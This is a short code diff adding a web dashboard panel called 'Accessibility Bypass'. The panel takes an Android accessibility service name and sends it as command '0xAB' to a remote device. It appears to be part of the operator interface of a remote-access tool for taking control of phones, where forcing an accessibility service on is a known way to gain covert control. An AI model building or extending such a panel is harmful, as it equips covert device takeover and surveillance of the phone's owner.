@@ -1,0 +1,45 @@
+<div class="ui segment">
+    <h3 class="ui header">Accessibility Bypass</h3>
+
+    <div class="ui form">
+        <div class="field">
+            <label>Accessibility Service Name</label>
+            <input id="accessibilityService" type="text" placeholder="com.example.service/.MyAccessibilityService">
+            <div class="ui pointing label">
+                Enter the accessibility service component name to register.
+            </div>
+        </div>
+        <button class="ui primary button" onclick="sendAccessibilityBypass(this)">Enable Bypass</button>
+    </div>
+
+    <script>
+        function sendAccessibilityBypass(element) {
+            $(element).addClass('loading');
+            const service = $('#accessibilityService').val();
+
+            if (!service || service.trim().length === 0) {
+                showNotification('#f03434', 'Please provide the accessibility service name');
+                $(element).removeClass('loading');
+                return;
+            }
+
+            const params = {
+                service: service.trim()
+            };
+
+            sendCommand('0xAB', params, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error);
+                        $(element).removeClass('loading');
+                    }, 300);
+                } else {
+                    setTimeout(() => {
+                        showNotification('#2ecc71', message || 'Accessibility bypass request sent');
+                        $(element).removeClass('loading');
+                    }, 300);
+                }
+            });
+        }
+    </script>
+</div>
